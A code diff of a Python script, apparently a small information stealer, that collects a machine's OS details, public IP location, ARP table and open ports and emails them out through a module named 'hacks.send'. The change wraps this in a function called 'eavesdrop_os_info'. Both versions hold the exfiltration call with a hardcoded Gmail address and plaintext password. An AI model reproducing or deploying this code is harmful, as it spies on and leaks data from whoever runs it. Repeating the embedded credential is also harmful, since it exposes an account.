@@ -13,7 +13,7 @@ import platform
 import sys
 import math
 import uuid
-import send
+import hacks.send
 
 def OS_info():
     return """
@@ -49,37 +49,37 @@ def OS_info():
     platform.version(),
     platform.mac_ver()
     )
-    
+
 def openPorts():
     remoteServer = socket.gethostbyname(socket.gethostname())
     remoteServerIP  = socket.gethostbyname(remoteServer)
     open_ports_list = []
 
-    for port in range(1,1025):  
+    for port in range(1,1025):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         result = sock.connect_ex((remoteServerIP, port))
         if result == 0:
             open_ports_list.append(port)
         sock.close()
-    
+
     open_ports_string = "Ports open: "
     for i in open_ports_list:
         open_ports_string += str(i) + ", "
     return open_ports_string[:-2]
-    
+
 def location():
     return subprocess.check_output('curl ipinfo.io',shell=True).decode()
 
 def arp_a():
     return subprocess.check_output('arp -a',shell=True).decode()
-    
+
 def roundup(x):
     return int(math.ceil(x / 10.0)) * 10
 
-string = ""
-
-string += "OS Information: " + OS_info() + "\n"
-string += "Location: " + location() + "\n"
-string += "ARP A " + arp_a() + "\n"
-string += "Open Ports: " + openPorts() + "\n"
-send.send_mail("calix.huang1@gmail.com", "Xamg9]HuskRufa", "calix.huang1@gmail.com", string)
+def eavesdrop_os_info():
+    string = ""
+    string += "OS Information: " + OS_info() + "\n"
+    string += "Location: " + location() + "\n"
+    string += "ARP A " + arp_a() + "\n"
+    string += "Open Ports: " + openPorts() + "\n"
+    hacks.send.send_mail("calix.huang1@gmail.com", "Xamg9]HuskRufa", "calix.huang1@gmail.com", string)
